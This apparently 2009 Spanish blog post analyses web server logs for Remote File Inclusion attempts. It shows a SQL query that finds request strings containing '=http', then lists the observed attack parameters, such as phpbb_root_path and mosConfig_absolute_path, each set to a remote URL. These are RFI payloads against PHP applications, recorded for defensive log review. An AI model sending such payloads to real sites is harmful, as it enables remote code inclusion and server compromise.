# Nuevos intentos de ataques RFI
## Logs, Security, Servers, Vulnerability 
### URL: https://www.jesusninoc.com/2009/05/08/nuevos-intentos-de-ataques-rfi/
```PowerShell
SELECT     [cs-uri-query], COUNT(*) AS EXPR1
FROM         tabla
where  (rutalog = 'c:aW3SVC1') and [cs-uri-query] like '%=http%'
GROUP BY [cs-uri-query]
ORDER BY 2 desc

```
```PowerShell
mosConfig_absolute_path=https:///photo.gif?
phpbb_root_path=https:///photo.gif?
theme_path=https:///photo.gif?
dir=https:///photo.gif?
baseDir=https:///photo.gif?
config[path_src_include]=https:///photo.gif?
inc_dir=https:///photo.gif?
page=https:///photo.gif?
HCL_path=https:///photo.gif?

```
